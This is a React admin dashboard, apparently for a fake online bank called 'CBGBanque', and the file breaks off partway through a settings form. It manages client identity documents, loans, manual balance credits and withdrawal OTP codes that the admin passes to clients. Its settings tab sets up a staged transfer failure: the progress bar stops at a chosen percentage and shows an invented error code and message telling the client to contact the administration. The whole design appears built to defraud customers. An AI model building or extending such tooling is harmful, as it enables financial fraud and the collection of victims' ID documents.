"use client";

import React, { useState, useEffect, useCallback } from "react";
import { useRouter } from "next/navigation";

interface User {
  id: string;
  email: string;
  civility: string;
  firstName: string;
  lastName: string;
  phone: string;
  birthDate: string;
  birthPlace: string;
  nationality: string;
  residenceCountry: string;
  currency: string;
  address: string;
  city: string;
  postalCode: string;
  profession: string;
  monthlyIncome?: string | null;
  documentType: string;
  idCardFront?: string | null;
  idCardBack?: string | null;
  status: "pending" | "approved" | "rejected" | "blocked";
  createdAt: string;
}

interface AdminLoan {
  id: string;
  userId: string;
  amount: number;
  durationMonths: number;
  currency: string;
  purpose: string;
  status: "pending" | "approved" | "rejected";
  createdAt: string;
  userEmail?: string;
  userName?: string;
  userLastName?: string;
  userPhone?: string;
  monthlyIncome?: string;
  profession?: string;
}

interface AdminWithdrawal {
  id: string;
  userId: string;
  recipientName: string;
  iban: string;
  bic: string;
  amountCents: number;
  description?: string;
  otpCode: string;
  status: "pending_otp" | "failed_verification" | "blocked_at_routing" | "completed";
  createdAt: string;
  userFirstName?: string;
  userLastName?: string;
  userEmail?: string;
}

interface TransferSettings {
  id: number;
  haltPercent: number;
  haltMessage: string;
  errorCode: string;
  updatedAt: string;
}

export default function AdminPage() {
  const router = useRouter();

  const [isAuthenticated, setIsAuthenticated] = useState<boolean>(false);
  const [loadingAuth, setLoadingAuth] = useState<boolean>(true);

  const [usernameInput, setUsernameInput] = useState("");
  const [passwordInput, setPasswordInput] = useState("");
  const [errorMsg, setErrorMsg] = useState("");

  // Données de l'application admin
  const [users, setUsers] = useState<User[]>([]);
  const [loans, setLoans] = useState<AdminLoan[]>([]);
  const [withdrawals, setWithdrawals] = useState<AdminWithdrawal[]>([]);
  const [transferSettings, setTransferSettings] = useState<TransferSettings | null>(null);
  const [selectedUser, setSelectedUser] = useState<User | null>(null);
  const [activeTab, setActiveTab] = useState<"users" | "loans" | "withdrawals" | "settings">("users");

  // Credit user modal
  const [creditUser, setCreditUser] = useState<User | null>(null);
  const [creditAmount, setCreditAmount] = useState("");
  const [creditDescription, setCreditDescription] = useState("Crédit bancaire CBG Finance");
  const [creditLoading, setCreditLoading] = useState(false);
  const [creditFeedback, setCreditFeedback] = useState("");
  const [copiedCodeId, setCopiedCodeId] = useState<string | null>(null);

  // Transfer settings modal
  const [settingsLoading, setSettingsLoading] = useState(false);
  const [settingsFeedback, setSettingsFeedback] = useState("");
  const [haltPercentInput, setHaltPercentInput] = useState(75);
  const [haltMessageInput, setHaltMessageInput] = useState("");
  const [errorCodeInput, setErrorCodeInput] = useState("");

  // Block user modal
  const [blockUser, setBlockUser] = useState<User | null>(null);
  const [blockUserReason, setBlockUserReason] = useState("");
  const [blockUserLoading, setBlockUserLoading] = useState(false);

  // Block withdrawal modal
  const [blockWithdrawal, setBlockWithdrawal] = useState<AdminWithdrawal | null>(null);
  const [blockWithdrawalReason, setBlockWithdrawalReason] = useState("");
  const [blockWithdrawalLoading, setBlockWithdrawalLoading] = useState(false);

  const fetchUsers = useCallback(async () => {
    try {
      const res = await fetch("/api/admin/users");
      if (res.status === 401) {
        setIsAuthenticated(false);
        return;
      }
      const data = await res.json();
      if (data.success) {
        setUsers(data.users);
        setIsAuthenticated(true);
      }
    } catch (err) {
      console.error("Erreur chargement utilisateurs", err);
    }
  }, []);

  const fetchLoans = useCallback(async () => {
    try {
      const res = await fetch("/api/admin/loans");
      const data = await res.json();
      if (data.success && data.loans) {
        setLoans(data.loans);
      }
    } catch (err) {
      console.error("Erreur chargement prêts admin", err);
    }
  }, []);

  const fetchWithdrawals = useCallback(async () => {
    try {
      const res = await fetch("/api/admin/withdrawals");
      const data = await res.json();
      if (data.success && data.withdrawals) {
        setWithdrawals(data.withdrawals);
      }
    } catch (err) {
      console.error("Erreur chargement retraits admin", err);
    }
  }, []);

  const fetchTransferSettings = useCallback(async () => {
    try {
      const res = await fetch("/api/admin/transfer-settings");
      const data = await res.json();
      if (data.success && data.settings) {
        setTransferSettings(data.settings);
        setHaltPercentInput(data.settings.haltPercent);
        setHaltMessageInput(data.settings.haltMessage);
        setErrorCodeInput(data.settings.errorCode);
      }
    } catch (err) {
      console.error("Erreur chargement paramètres virement", err);
    }
  }, []);

  useEffect(() => {
    let active = true;
    fetch("/api/admin/users")
      .then(async (res) => {
        if (res.status === 401) {
          if (active) setIsAuthenticated(false);
          return;
        }
        const data = await res.json();
        if (active && data.success) {
          setUsers(data.users);
          setIsAuthenticated(true);
          fetchLoans();
          fetchWithdrawals();
          fetchTransferSettings();
        }
      })
      .catch((error: unknown) => console.error("Erreur chargement utilisateurs", error))
      .finally(() => {
        if (active) setLoadingAuth(false);
      });

    return () => {
      active = false;
    };
  }, [fetchLoans, fetchWithdrawals, fetchTransferSettings]);

  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg("");

    try {
      const res = await fetch("/api/admin/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: usernameInput, password: passwordInput }),
      });

      if (res.ok) {
        await fetchUsers();
        await fetchLoans();
        await fetchWithdrawals();
        router.refresh();
      } else {
        const data = await res.json();
        setErrorMsg(data.message ?? "Identifiants incorrects.");
      }
    } catch {
      setErrorMsg("Une erreur est survenue lors de la connexion.");
    }
  };

  const handleLogout = async () => {
    try {
      const response = await fetch("/api/admin/logout", { method: "POST" });
      if (!response.ok) throw new Error("Échec de la déconnexion.");
      setIsAuthenticated(false);
      router.push("/admin");
    } catch (error) {
      console.error("Erreur lors de la déconnexion administrateur :", error);
      setErrorMsg("Impossible de fermer la session administrateur.");
    }
  };

  const updateStatus = async (userId: string, newStatus: "approved" | "rejected" | "blocked", reason?: string) => {
    try {
      const res = await fetch("/api/admin/users", {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId, status: newStatus, reason }),
      });
      const data = await res.json();
      if (res.ok && data.success) {
        setUsers((prev) =>
          prev.map((u) => (u.id === userId ? { ...u, status: newStatus } : u))
        );
        if (selectedUser?.id === userId) {
          setSelectedUser((prev) => prev ? { ...prev, status: newStatus } : null);
        }
        if (blockUser?.id === userId) {
          setBlockUser(null);
          setBlockUserReason("");
        }
      } else {
        alert(data.message || "Erreur lors de la mise à jour");
      }
    } catch {
      alert("Erreur de connexion.");
    }
  };

  const blockWithdrawalAction = async (withdrawalId: string, reason: string) => {
    try {
      const res = await fetch("/api/admin/withdrawals/block", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ withdrawalId, reason }),
      });
      const data = await res.json();
      if (res.ok && data.success) {
        setWithdrawals((prev) =>
          prev.map((w) => (w.id === withdrawalId ? { ...w, status: "blocked_at_routing" } : w))
        );
        setBlockWithdrawal(null);
        setBlockWithdrawalReason("");
        alert("Virement bloqué avec succès.");
      } else {
        alert(data.message || "Erreur lors du blocage");
      }
    } catch {
      alert("Erreur de connexion.");
    }
  };

  const updateLoanStatus = async (loanId: string, status: "approved" | "rejected") => {
    try {
      const res = await fetch("/api/admin/loans", {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ loanId, status }),
      });
      const data = await res.json();
      if (res.ok && data.success) {
        setLoans((prev) =>
          prev.map((l) => (l.id === loanId ? { ...l, status } : l))
        );
        alert(status === "approved" ? "Prêt approuvé et fonds crédités sur le compte client !" : "Prêt refusé.");
      } else {
        alert(data.message || "Erreur lors de la mise à jour");
      }
    } catch {
      alert("Erreur de communication avec le serveur.");
    }
  };

  const handleCreditSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!creditUser || !creditAmount) return;

    setCreditLoading(true);
    setCreditFeedback("");

    try {
      const res = await fetch("/api/admin/credit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId: creditUser.id,
          amount: creditAmount,
          description: creditDescription,
        }),
      });

      const data = await res.json();
      if (!res.ok) throw new Error(data.message ?? "Échec du crédit.");

      setCreditFeedback(data.message);
      setTimeout(() => {
        setCreditUser(null);
        setCreditAmount("");
        setCreditFeedback("");
      }, 1800);
    } catch (err) {
      alert(err instanceof Error ? err.message : "Erreur.");
    } finally {
      setCreditLoading(false);
    }
  };

  const handleTransferSettingsSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setSettingsLoading(true);
    setSettingsFeedback("");

    try {
      const res = await fetch("/api/admin/transfer-settings", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          haltPercent: haltPercentInput,
          haltMessage: haltMessageInput,
          errorCode: errorCodeInput,
        }),
      });

      const data = await res.json();
      if (!res.ok) throw new Error(data.message ?? "Échec de la mise à jour.");

      setSettingsFeedback(data.message);
      setTransferSettings(data.settings);
      setTimeout(() => {
        setSettingsFeedback("");
      }, 2000);
    } catch (err) {
      alert(err instanceof Error ? err.message : "Erreur.");
    } finally {
      setSettingsLoading(false);
    }
  };

  const copyCode = (code: string, id: string) => {
    navigator.clipboard.writeText(code);
    setCopiedCodeId(id);
    setTimeout(() => setCopiedCodeId(null), 2500);
  };

  if (loadingAuth) {
    return (
      <div className="admin-loading-screen">
        <div className="spinner-border text-primary" role="status"></div>
        <p>Vérification de session administrateur…</p>
      </div>
    );
  }

  // Écran de connexion si non connecté
  if (!isAuthenticated) {
    return (
      <div className="admin-auth-overlay">
        <div className="admin-auth-card">
          <div className="admin-auth-header">
            <span className="admin-badge">ESPACE SÉCURISÉ</span>
            <h2>Supervision CBGBanque</h2>
            <p>Connectez-vous pour gérer les utilisateurs, crédits et validations.</p>
          </div>

          {errorMsg && (
            <div className="admin-alert-error" role="alert">
              <i className="fa-solid fa-triangle-exclamation"></i> {errorMsg}
            </div>
          )}

          <form onSubmit={handleLoginSubmit} className="admin-auth-form">
            <div className="form-group-admin">
              <label htmlFor="admin-username">Identifiant Administrateur</label>
              <div className="input-icon-wrap">
                <i className="fa-solid fa-user-shield"></i>
                <input
                  id="admin-username"
                  type="text"
                  required
                  value={usernameInput}
                  onChange={(e) => setUsernameInput(e.target.value)}
                  placeholder="admin"
                />
              </div>
            </div>

            <div className="form-group-admin">
              <label htmlFor="admin-password">Mot de passe secret</label>
              <div className="input-icon-wrap">
                <i className="fa-solid fa-lock"></i>
                <input
                  id="admin-password"
                  type="password"
                  required
                  value={passwordInput}
                  onChange={(e) => setPasswordInput(e.target.value)}
                  placeholder="••••••••"
                />
              </div>
            </div>

            <button type="submit" className="btn-admin-submit">
              Accéder au Panneau
            </button>
          </form>
        </div>
      </div>
    );
  }

  const pendingUsers = users.filter((u) => u.status === "pending");
  const pendingLoans = loans.filter((l) => l.status === "pending");
  const pendingWithdrawals = withdrawals.filter((w) => w.status === "pending_otp");

  return (
    <div className="admin-dashboard-page">
      <div className="admin-container">
        
        {/* En-tête du Dashboard */}
        <div className="admin-top-header">
          <div className="admin-title-group">
            <span className="admin-badge-role">PANNEAU DE CONTRÔLE</span>
            <h1 className="admin-main-title">Gestion CBGBanque</h1>
          </div>
          <button onClick={handleLogout} className="btn-logout-admin">
            <i className="fa-solid fa-right-from-bracket"></i> Déconnexion
          </button>
        </div>

        {/* Statistiques Globales dynamiques */}
        <div className="admin-stats-grid">
          <div className="admin-stat-card">
            <span className="stat-card-label">Total Utilisateurs</span>
            <div className="stat-card-value">{users.length}</div>
            <span className="stat-card-trend positive">Comptes enregistrés</span>
          </div>

          <div className="admin-stat-card">
            <span className="stat-card-label">KYC en attente</span>
            <div className="stat-card-value highlight-amber">{pendingUsers.length}</div>
            <span className="stat-card-trend">Identités à valider</span>
          </div>

          <div className="admin-stat-card">
            <span className="stat-card-label">Prêts en attente</span>
            <div className="stat-card-value highlight-amber">{pendingLoans.length}</div>
            <span className="stat-card-trend">Dossiers de crédit</span>
          </div>

          <div className="admin-stat-card">
            <span className="stat-card-label">Codes OTP Retraits</span>
            <div className="stat-card-value" style={{ color: "#a855f7" }}>{pendingWithdrawals.length}</div>
            <span className="stat-card-trend">Codes à transmettre</span>
          </div>
        </div>

        {/* Tab Switcher: Utilisateurs / Prêts / Retraits */}
        <div style={{ display: "flex", flexWrap: "wrap", gap: "0.75rem", margin: "2rem 0 1rem 0" }}>
          <button
            onClick={() => setActiveTab("users")}
            style={{
              background: activeTab === "users" ? "#2563eb" : "rgba(255,255,255,0.06)",
              color: "#fff",
              padding: "0.75rem 1.25rem",
              borderRadius: "12px",
              border: "1px solid rgba(255,255,255,0.1)",
              fontWeight: 700,
              fontSize: "0.95rem",
              cursor: "pointer",
            }}
          >
            <i className="fa-solid fa-users"></i> Inscriptions & KYC ({pendingUsers.length})
          </button>

          <button
            onClick={() => setActiveTab("loans")}
            style={{
              background: activeTab === "loans" ? "#2563eb" : "rgba(255,255,255,0.06)",
              color: "#fff",
              padding: "0.75rem 1.25rem",
              borderRadius: "12px",
              border: "1px solid rgba(255,255,255,0.1)",
              fontWeight: 700,
              fontSize: "0.95rem",
              cursor: "pointer",
            }}
          >
            <i className="fa-solid fa-file-lines"></i> Demandes de financement ({pendingLoans.length})
          </button>

          <button
            onClick={() => setActiveTab("withdrawals")}
            style={{
              background: activeTab === "withdrawals" ? "#9333ea" : "rgba(255,255,255,0.06)",
              color: "#fff",
              padding: "0.75rem 1.25rem",
              borderRadius: "12px",
              border: "1px solid rgba(255,255,255,0.1)",
              fontWeight: 700,
              fontSize: "0.95rem",
              cursor: "pointer",
            }}
          >
            <i className="fa-solid fa-key"></i> Retraits & Codes OTP ({pendingWithdrawals.length})
          </button>

          <button
            onClick={() => setActiveTab("settings")}
            style={{
              background: activeTab === "settings" ? "#64748b" : "rgba(255,255,255,0.06)",
              color: "#fff",
              padding: "0.75rem 1.25rem",
              borderRadius: "12px",
              border: "1px solid rgba(255,255,255,0.1)",
              fontWeight: 700,
              fontSize: "0.95rem",
              cursor: "pointer",
            }}
          >
            <i className="fa-solid fa-gear"></i> Paramètres Virements
          </button>
        </div>

        {/* ================= ONGLET 1 : UTILISATEURS (KYC & CRÉDITER) ================= */}
        {activeTab === "users" && (
          <div className="admin-section">
            <div className="section-header-admin">
              <h3 className="admin-section-title">Comptes clients & Justificatifs KYC</h3>
              <span className="badge-count">{users.length} comptes au total</span>
            </div>

            <div className="admin-table-wrapper">
              <table className="admin-table">
                <thead>
                  <tr>
                    <th>Utilisateur</th>
                    <th>Email</th>
                    <th>Pays</th>
                    <th>Salaire</th>
                    <th>Document</th>
                    <th>Actions</th>
                  </tr>
                </thead>
                <tbody>
                  {users.length === 0 ? (
                    <tr>
                      <td colSpan={6} style={{ textAlign: "center", padding: "2rem", color: "#94a3b8" }}>
                        Aucun utilisateur inscrit pour le moment.
                      </td>
                    </tr>
                  ) : (
                    users.map((user) => (
                      <tr key={user.id}>
                        <td>
                          <div className="user-td-info">
                            <span className="user-avatar-sm">
                              {user.firstName?.[0]}{user.lastName?.[0]}
                            </span>
                            <div>
                              <strong>{user.civility} {user.firstName} {user.lastName}</strong>
                              <span className="user-sub-td">Statut : <strong>{user.status}</strong></span>
                            </div>
                          </div>
                        </td>
                        <td>{user.email}</td>
                        <td>{user.residenceCountry}</td>
                        <td><strong>{user.monthlyIncome ? `${user.monthlyIncome} €` : "—"}</strong></td>
                        <td>
                          <span className="doc-badge-table">
                            {user.documentType} {user.idCardFront ? "✓ Photos" : ""}
                          </span>
                        </td>
                        <td>
                          <div className="table-actions-row">
                            {/* Bouton CRÉDITER LE COMPTE */}
                            <button
                              onClick={() => {
                                setCreditUser(user);
                                setCreditAmount("");
                                setCreditDescription("Crédit bancaire CBG Finance");
                                setCreditFeedback("");
                              }}
                              style={{
                                background: "rgba(16, 185, 129, 0.2)",
                                color: "#10b981",
                                border: "1px solid rgba(16, 185, 129, 0.4)",
                                padding: "0.4rem 0.75rem",
                                borderRadius: "8px",
                                fontWeight: 700,
                                fontSize: "0.8rem",
                                cursor: "pointer",
                              }}
                            >
                              <i className="fa-solid fa-plus-circle"></i> Créditer
                            </button>

                            <button
                              className="btn-table-details"
                              onClick={() => setSelectedUser(user)}
                              style={{ background: "rgba(59, 130, 246, 0.15)", color: "#3b82f6", border: "1px solid rgba(59, 130, 246, 0.3)", padding: "0.4rem 0.75rem", borderRadius: "8px", fontWeight: 600, fontSize: "0.8rem", cursor: "pointer" }}
                            >
                              <i className="fa-solid fa-eye"></i> Pièces
                            </button>

                            {user.status !== "approved" && (
                              <button className="btn-table-approve" onClick={() => updateStatus(user.id, "approved")}>
                                <i className="fa-solid fa-check"></i> Valider
                              </button>
                            )}
                            {user.status !== "rejected" && (
                              <button className="btn-table-reject" onClick={() => updateStatus(user.id, "rejected")}>
                                <i className="fa-solid fa-xmark"></i> Rejeter
                              </button>
                            )}
                            {user.status !== "blocked" && (
                              <button
                                onClick={() => {
                                  setBlockUser(user);
                                  setBlockUserReason("");
                                }}
                                style={{
                                  background: "rgba(239, 68, 68, 0.2)",
                                  color: "#ef4444",
                                  border: "1px solid rgba(239, 68, 68, 0.4)",
                                  padding: "0.4rem 0.75rem",
                                  borderRadius: "8px",
                                  fontWeight: 700,
                                  fontSize: "0.8rem",
                                  cursor: "pointer",
                                }}
                              >
                                <i className="fa-solid fa-ban"></i> Bloquer
                              </button>
                            )}
                          </div>
                        </td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {/* ================= ONGLET 2 : DEMANDES DE PRÊT ================= */}
        {activeTab === "loans" && (
          <div className="admin-section">
            <div className="section-header-admin">
              <h3 className="admin-section-title">Demandes de financement</h3>
              <span className="badge-count">{loans.length} dossiers</span>
            </div>

            <div className="admin-table-wrapper">
              <table className="admin-table">
                <thead>
                  <tr>
                    <th>Demandeur</th>
                    <th>Montant demandé</th>
                    <th>Durée</th>
                    <th>Motif</th>
                    <th>Statut</th>
                    <th>Actions</th>
                  </tr>
                </thead>
                <tbody>
                  {loans.length === 0 ? (
                    <tr>
                      <td colSpan={6} style={{ textAlign: "center", padding: "2rem", color: "#94a3b8" }}>
                        Aucune demande de financement enregistrée.
                      </td>
                    </tr>
                  ) : (
                    loans.map((loan) => (
                      <tr key={loan.id}>
                        <td>
                          <div>
                            <strong>{loan.userName || "Client"} {loan.userLastName || ""}</strong>
                            <div style={{ fontSize: "0.78rem", color: "#94a3b8" }}>{loan.userEmail}</div>
                            {loan.monthlyIncome && (
                              <div style={{ fontSize: "0.75rem", color: "#60a5fa" }}>
                                Revenu : {loan.monthlyIncome} {loan.currency}/mois
                              </div>
                            )}
                          </div>
                        </td>
                        <td>
                          <strong style={{ fontSize: "1.05rem", color: "#60a5fa" }}>
                            {new Intl.NumberFormat("fr-FR", { style: "currency", currency: loan.currency }).format(loan.amount)}
                          </strong>
                        </td>
                        <td>
                          {loan.durationMonths} mois
                        </td>
                        <td>
                          <span className="doc-badge-table">{loan.purpose}</span>
                        </td>
                        <td>
                          <span
                            style={{
                              padding: "0.25rem 0.6rem",
                              borderRadius: "6px",
                              fontSize: "0.8rem",
                              fontWeight: 700,
                              background:
                                loan.status === "approved"
                                  ? "rgba(34,197,94,0.15)"
                                  : loan.status === "rejected"
                                  ? "rgba(239,68,68,0.15)"
                                  : "rgba(245,158,11,0.15)",
                              color:
                                loan.status === "approved"
                                  ? "#22c55e"
                                  : loan.status === "rejected"
                                  ? "#ef4444"
                                  : "#f59e0b",
                            }}
                          >
                            {loan.status === "approved" ? "Approuvé & Crédité" : loan.status === "rejected" ? "Refusé" : "En attente"}
                          </span>
                        </td>
                        <td>
                          <div className="table-actions-row">
                            {loan.status === "pending" && (
                              <>
                                <button
                                  className="btn-table-approve"
                                  onClick={() => updateLoanStatus(loan.id, "approved")}
                                  title="Approuver le prêt et créditer automatiquement le solde"
                                >
                                  <i className="fa-solid fa-check"></i> Valider & Créditer
                                </button>
                                <button
                                  className="btn-table-reject"
                                  onClick={() => updateLoanStatus(loan.id, "rejected")}
                                  title="Refuser la demande"
                                >
                                  <i className="fa-solid fa-xmark"></i> Refuser
                                </button>
                              </>
                            )}
                          </div>
                        </td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {/* ================= ONGLET 3 : RETRAITS & CODES OTP ================= */}
        {activeTab === "withdrawals" && (
          <div className="admin-section">
            <div className="section-header-admin">
              <h3 className="admin-section-title">Demandes de retraits & Codes OTP de sécurité</h3>
              <button
                type="button"
                onClick={fetchWithdrawals}
                style={{
                  background: "rgba(255,255,255,0.08)",
                  border: "none",
                  color: "#fff",
                  padding: "0.4rem 0.85rem",
                  borderRadius: "8px",
                  fontSize: "0.85rem",
                  cursor: "pointer",
                }}
              >
                <i className="fa-solid fa-arrows-rotate"></i> Actualiser
              </button>
            </div>

            <div className="admin-table-wrapper">
              <table className="admin-table">
                <thead>
                  <tr>
                    <th>Demandeur</th>
                    <th>Montant</th>
                    <th>Bénéficiaire & IBAN</th>
                    <th>Code OTP généré</th>
                    <th>Statut</th>
                    <th>Date</th>
                  </tr>
                </thead>
                <tbody>
                  {withdrawals.length === 0 ? (
                    <tr>
                      <td colSpan={6} style={{ textAlign: "center", padding: "2.5rem", color: "#94a3b8" }}>
                        Aucune demande de virement ou code OTP enregistré pour le moment.
                      </td>
                    </tr>
                  ) : (
                    withdrawals.map((item) => (
                      <tr key={item.id}>
                        <td>
                          <strong>{item.userFirstName || "Client"} {item.userLastName || ""}</strong>
                          <div style={{ fontSize: "0.75rem", color: "#94a3b8" }}>{item.userEmail}</div>
                        </td>
                        <td>
                          <strong style={{ fontSize: "1.1rem", color: "#60a5fa" }}>
                            {(item.amountCents / 100).toFixed(2)} €
                          </strong>
                        </td>
                        <td>
                          <div><strong>{item.recipientName}</strong></div>
                          <div style={{ fontSize: "0.75rem", fontFamily: "monospace", color: "#cbd5e1" }}>
                            {item.iban} ({item.bic})
                          </div>
                        </td>
                        <td>
                          <div style={{ display: "flex", alignItems: "center", gap: "0.5rem", flexWrap: "wrap" }}>
                            <span
                              style={{
                                background: "#4c1d95",
                                color: "#f3e8ff",
                                border: "1px solid #7c3aed",
                                padding: "0.35rem 0.75rem",
                                borderRadius: "8px",
                                fontFamily: "monospace",
                                fontSize: "1.1rem",
                                fontWeight: 800,
                                letterSpacing: "2px",
                              }}
                            >
                              {item.otpCode}
                            </span>
                            <button
                              type="button"
                              onClick={() => copyCode(item.otpCode, item.id)}
                              style={{
                                background: "rgba(255,255,255,0.08)",
                                border: "none",
                                color: "#fff",
                                padding: "0.4rem 0.6rem",
                                borderRadius: "6px",
                                cursor: "pointer",
                                fontSize: "0.75rem",
                              }}
                              title="Copier le code pour le transmettre au client"
                            >
                              <i className={`fa-solid ${copiedCodeId === item.id ? "fa-check" : "fa-copy"}`}></i>
                            </button>
                            {item.status === "pending_otp" && (
                              <button
                                onClick={() => {
                                  setBlockWithdrawal(item);
                                  setBlockWithdrawalReason("");
                                }}
                                style={{
                                  background: "rgba(239, 68, 68, 0.2)",
                                  color: "#ef4444",
                                  border: "1px solid rgba(239, 68, 68, 0.4)",
                                  padding: "0.4rem 0.6rem",
                                  borderRadius: "6px",
                                  cursor: "pointer",
                                  fontSize: "0.7rem",
                                  fontWeight: 700,
                                }}
                                title="Bloquer ce virement"
                              >
                                <i className="fa-solid fa-ban"></i> Bloquer
                              </button>
                            )}
                          </div>
                        </td>
                        <td>
                          <span
                            style={{
                              padding: "0.25rem 0.6rem",
                              borderRadius: "6px",
                              fontSize: "0.8rem",
                              fontWeight: 700,
                              background:
                                item.status === "pending_otp"
                                  ? "rgba(245,158,11,0.2)"
                                  : item.status === "blocked_at_routing"
                                  ? "rgba(239,68,68,0.2)"
                                  : "rgba(34,197,94,0.2)",
                              color:
                                item.status === "pending_otp"
                                  ? "#fbbf24"
                                  : item.status === "blocked_at_routing"
                                  ? "#f87171"
                                  : "#34d399",
                            }}
                          >
                            {item.status === "pending_otp"
                              ? "En attente saisie client"
                              : item.status === "blocked_at_routing"
                              ? "Bloqué à 75% (Err routage)"
                              : "Complété"}
                          </span>
                        </td>
                        <td style={{ fontSize: "0.8rem", color: "#94a3b8" }}>
                          {new Date(item.createdAt).toLocaleString("fr-FR")}
                        </td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {/* ================= ONGLET 4 : PARAMÈTRES VIREMENTS ================= */}
        {activeTab === "settings" && (
          <div className="admin-section">
            <div className="section-header-admin">
              <h3 className="admin-section-title">Configuration des virements sortants</h3>
              <span className="badge-count">Contrôle du comportement d&apos;arrêt</span>
            </div>

            <div style={{ maxWidth: "700px" }}>
              <div style={{ background: "rgba(255,255,255,0.03)", border: "1px solid rgba(255,255,255,0.08)", borderRadius: "16px", padding: "2rem" }}>
                <div style={{ marginBottom: "1.5rem", padding: "1rem", background: "rgba(59, 130, 246, 0.1)", border: "1px solid rgba(59, 130, 246, 0.3)", borderRadius: "12px" }}>
                  <h4 style={{ margin: "0 0 0.5rem 0", color: "#93c5fd", display: "flex", alignItems: "center", gap: "0.5rem" }}>
                    <i className="fa-solid fa-circle-info"></i> Fonctionnement
                  </h4>
                  <p style={{ margin: 0, color: "rgba(255,255,255,0.8)", fontSize: "0.9rem", lineHeight: 1.6 }}>
                    Quand un client saisit son code OTP pour valider un virement, une animation de chargement démarre.
                    Le virement progresse visuellement jusqu&apos;au <strong>pourcentage d&apos;arrêt</strong> configuré ci-dessous,
                    puis s&apos;arrête avec un <strong>message d&apos;erreur personnalisé</strong>.
                    Le virement est marqué comme échoué et le client doit contacter l&apos;administration.
                  </p>
                </div>

                <form onSubmit={handleTransferSettingsSubmit} style={{ display: "flex", flexDirection: "column", gap: "1.5rem" }}>
                  {/* Halt Percent */}
                  <div>
                    <label style={{ display: "block", fontSize: "0.85rem", color: "#cbd5e1", marginBottom: "0.5rem", fontWeight: 600 }}>
                      Pourcentage d&apos;arrêt du chargement (%)
                    </label>
                    <div style={{ display: "flex", alignItems: "center", gap: "1rem" }}>
                      <input
                        type="number"
                        min="1"
                        max="100"
                        required
                        value={haltPercentInput}
                        onChange={(e) => setHaltPercentInput(Math.min(100, Math.max(1, parseInt(e.target.value) || 1)))}
                        style={{
                          width: "120px",
                          padding: "0.85rem 1rem",
                          borderRadius: "10px",
                          background: "rgba(255,255,255,0.06)",
                          border: "1px solid rgba(255,255,255,0.15)",
                          color: "#fff",
                          fontSize: "1.1rem",
                          fontWeight: 700,
                          textAlign: "center",
                        }}
                      />
                      <span style={{ color: "#94a3b8", fontSize: "0.9rem" }}>Le chargement s&apos;arrêtera à ce pourcentage (ex: 75 = 75%)</span>
                    </div>
                  </div>

                  {/* Error Code */}
                  <div>
                    <label style={{ display: "block", fontSize: "0.85rem", color: "#cbd5e1", marginBottom: "0.5rem", fontWeight: 600 }}>
                      Code d&apos;erreur technique
                    </label>
                    <input
                      type="text"
                      value={errorCodeInput}
                      onChange={(e) => setErrorCodeInput(e.target.value)}
                      placeholder="Ex: ERR_INTERBANK_ROUTING_SUSPENDED"
                      style={{
                        width: "100%",
                        maxWidth: "400px",
                        padding: "0.85rem 1rem",
                        borderRadius: "10px",
                        background: "rgba(255,255,255,0.06)",
                        border: "1px solid rgba(255,255,255,0.15)",
                        color: "#fff",
                        fontSize: "0.95rem",
                        fontFamily: "monospace",
                        boxSizing: "border-box",
                      }}
                    />
                    <p style={{ margin: "0.4rem 0 0 0", fontSize: "0.8rem", color: "#64748b" }}>
                      Code technique affiché dans les logs et notifications (ex: ERR_SEPA_75, ERR_INTERBANK_ROUTING_SUSPENDED)
                    </p>
                  </div>

                  {/* Halt Message */}
                  <div>
                    <label style={{ display: "block", fontSize: "0.85rem", color: "#cbd5e1", marginBottom: "0.5rem", fontWeight: 600 }}>
                      Message affiché au client à l&apos;arrêt
                    </label>
                    <textarea
                      required
                      value={haltMessageInput}
                      onChange={(e) => setHaltMessageInput(e.target.value)}
                      placeholder="Ex: Une erreur est survenue, veuillez contacter le gestionnaire ou bien tentez à nouveau plus tard."
                      rows={4}
                      style={{
                        width: "100%",
                        padding: "0.85rem 1rem",
                        borderRadius: "10px",
                        background: "rgba(255,255,255,0.06)",
                        border: "1px solid rgba(255,255,255,0.15)",
                        color: "#fff",
                        fontSize: "0.95rem",
                        fontFamily: "inherit",
                        boxSizing: "border-box",
                        resize: "vertical",
                      }}
                    />
                    <p style={{ margin: "0.4rem 0 0 0", fontSize: "0.8rem", color: "#64748b" }}>
                      Ce message s&apos;affiche au client quand le chargement atteint le pourcentage d&apos;arrêt. Rédigez-le à l&apos;avance comme vous le souhaitez.
                    </p>
                  </div>

                  {settingsFeedback && (
                    <div style={{ background: "rgba(16, 185, 129, 0.2)", border: "1px solid rgba(16, 185, 129, 0.4)", color: "#6ee7b7", padding: "0.75rem 1rem", borderRadius: "10px", fontSize: "0.9rem" }}>
                      <i className="fa-solid fa-circle-check"></i> {settingsFeedback}
                    </div>
                  )}

                  <div style={{ display: "flex", gap: "0.75rem", marginTop: "1rem" }}>
                    <button
                      type="button"
                      onClick={() => {
                        setHaltPercentInput(transferSettings?.haltPercent ?? 75);
                        setHaltMessageInput(transferSettings?.haltMessage ?? "");
                        setErrorCodeInput(transferSettings?.errorCode ?? "");
                        setSettingsFeedback("");
                      }}
                      style={{
                        flex: 1,
                        padding: "0.85rem",
                        borderRadius: "10px",
                        background: "rgba(255,255,255,0.08)",
                        border: "none",
                        color: "#fff",
                        fontWeight: 600,
                        cursor: "pointer",
                      }}
                    >
                      Réinitialiser
                    </button>
                    <button
                      type="submit"
                      disabled={settingsLoading}
                      style={{
                        flex: 1,
                        padding: "0.85rem",
                        borderRadius: "10px",
                        background: "linear-gradient(135deg, #4361ee, #3a0ca3)",
                        border: "none",
                        color: "#fff",
                        fontWeight: 700,
                        cursor: settingsLoading ? "wait" : "pointer",
                      }}
                    >
                      {settingsLoading ? "Enregistrement…" : "Enregistrer les paramètres"}
                    </button>
                  </div>
